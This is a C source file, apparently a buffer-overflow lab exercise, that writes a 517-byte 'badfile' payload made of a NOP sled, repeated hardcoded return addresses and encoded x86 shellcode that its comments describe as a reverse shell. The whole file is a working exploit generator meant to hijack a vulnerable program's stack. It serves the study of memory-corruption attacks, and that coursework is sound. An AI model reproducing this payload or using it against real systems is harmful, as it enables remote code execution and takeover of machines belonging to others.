/* exploit.c */
/* A program that creates a file containing code for launching shell*/
//construct bad file contents ,inject reverse shell into shellcode
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
//280 chars
char shellcode[]= "\xbb\xde\x6a\xd7\x6f\xd9\xc6\xd9\x74\x24\xf4\x58\x33\xc9"
"\xb1\x12\x31\x58\x12\x83\xe8\xfc\x03\x86\x64\x35\x9a\x07"
"\xa2\x4e\x86\x34\x17\xe2\x23\xb8\x1e\xe5\x04\xda\xed\x66"
"\xf7\x7b\x5e\x59\x35\xfb\xd7\xdf\x3c\x93\xed\x1f\xbd\x6c"
"\x9a\x1d\xc1\x63\x06\xab\x20\x33\xd0\xfb\xf3\x60\xae\xff"
"\x7a\x67\x1d\x7f\x2e\x0f\xf0\xaf\xbc\xa7\x64\x9f\x6d\x55"
"\x1c\x56\x92\xcb\x8d\xe1\xb4\x5b\x3a\x3f\xb6"
/* add your reverse shellcode here*/; 
char buffer_add[] = "\xb0\xea\xff\xbf";
char dest_add[] = "\x00\xeb\xff\xbf"; 

void main(int argc, char **argv)
{
char buffer[517];
//printf("%s", sizeof(shellcode));
FILE *badfile;
/* Initialize buffer with 0x90 (NOP instruction) */
memset(&buffer, 0x90, 517);
for (int i=0; i < 30; i++){
  memcpy(buffer+i*4, dest_add, 4); 
}
memcpy(buffer+(4*60), shellcode, sizeof(shellcode));
/* You need to fill the buffer with appropriate contents here 

strcpy(buffer+(4*18+1), shellcode);
for (int i=0; i < 87; ++i){
  memcpy(buffer+169+i*4, return_add, 4); 
}
*/


/* Save the contents to the file "badfile" */
badfile = fopen("./badfile", "w");
fwrite(buffer, 517, 1, badfile);
fclose(badfile);
}
